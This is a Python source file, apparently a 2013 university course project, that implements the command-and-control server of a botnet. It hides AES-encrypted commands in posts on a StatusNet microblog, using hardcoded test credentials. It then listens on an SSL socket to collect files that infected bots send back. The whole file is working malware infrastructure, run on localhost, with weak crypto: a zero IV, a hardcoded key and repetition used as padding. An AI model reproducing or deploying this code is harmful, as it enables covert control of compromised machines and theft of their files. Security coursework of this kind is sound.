#!/usr/bin/env python
# CS577botmaster.py - CS 577 Final Project
# by Adam Cotenoff (@acotenoff)
# 12 December 2013
import os, sys, socket, mechanize, base64, hashlib
from OpenSSL import SSL
from Crypto.Cipher import AES

def openWebsite(command):
	# request statusnet
	br = mechanize.Browser()
	response = br.open('http://localhost/statusnet/')
	response1 = br.response() 

	# greeted with login page, so you must login
	br.form = list(br.forms())[0] 
	# I created a user 'test' with password 'test' - need to login with these creds
	control1 = br.form.find_control('nickname')
	control1.value = base64.b64decode('dGVzdA==')
	control2 = br.form.find_control('password')
	control2.value = base64.b64decode('dGVzdA==')
	response = br.submit()

	br.select_form(nr=1)
	br.form.set_all_readonly(False)
	control3 = br.form.find_control('status_textarea')
	control3.value = command
	br.submit()

# creates a socket and wraps it in SSL
def createSocket(port, outFile):
	# opens up socket on localhost with the given port
	addr = ('127.0.0.1', port)

	# starts an SSL connection
	context = SSL.Context(SSL.SSLv23_METHOD)
	# uses the created private key file 'key'
	context.use_privatekey_file('key')
	# uses the created certicate with the private key file we just used
	context.use_certificate_file('cert')
	# actually opens the socket with all the given info
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# wraps the socket in SSL
	sock = SSL.Connection(context, sock)
	sock.bind(addr)
	# listens for bots to connect
	sock.listen(5)
	print 'Listening on port ' + str(port) + ':'

	accepted = False
	#waits for bots to connect to the botmaster
	while accepted == False:
		(connection, address) = sock.accept()
		print 'Accepted connection from ' + str(address)
		# when sendFile command is given, receives a file
		accepted = receiveFile(connection, outFile)
	sock.close()


# receives file from bot
def receiveFile(bot, outFile):
		data = bot.recv(4096)
		# file to save data from bot to
		with open(outFile, 'a') as myfile:
			myfile.write(data)
		myfile.close()
		bot.close()
		print 'Successfully received and saved file to ' + outFile
		return True

# encrypts command
def encryptCommand(command):
	password = base64.b64decode('VGVzdDEyMyE=')
	key = hashlib.sha256(password).digest()
	IV = 16 * '\x00'
	mode = AES.MODE_CBC
	encryptor = AES.new(key, mode, IV=IV)
	#text = 'j' * 64 + 'i' * 128
	ciphertext = encryptor.encrypt(command)
	return base64.b64encode(ciphertext)

def main():
	# Need to run program as roots
	if os.getuid() != 0:
   		print('Please run as root.')
   		return -1;

   	# usage checking
   	if len(sys.argv) != 3:
   			print 'Usage: python CS577botserver.py [listeningPort] [outputFile]'
   			return -1
  
  	# Set port and output file from command line arguments
   	listeningPort = int(sys.argv[1])
   	outputFile = sys.argv[2]
   	# Creates and a socket with the given port and specifices an output
   	while 1:
   		command = raw_input('Please enter a command: ')
   		openWebsite(encryptCommand(command * 16))
   		args = command.split('-|-')
   		if args[0] == 'sendFile':
   			createSocket(listeningPort, outputFile)

	
if __name__ == "__main__":
	main()
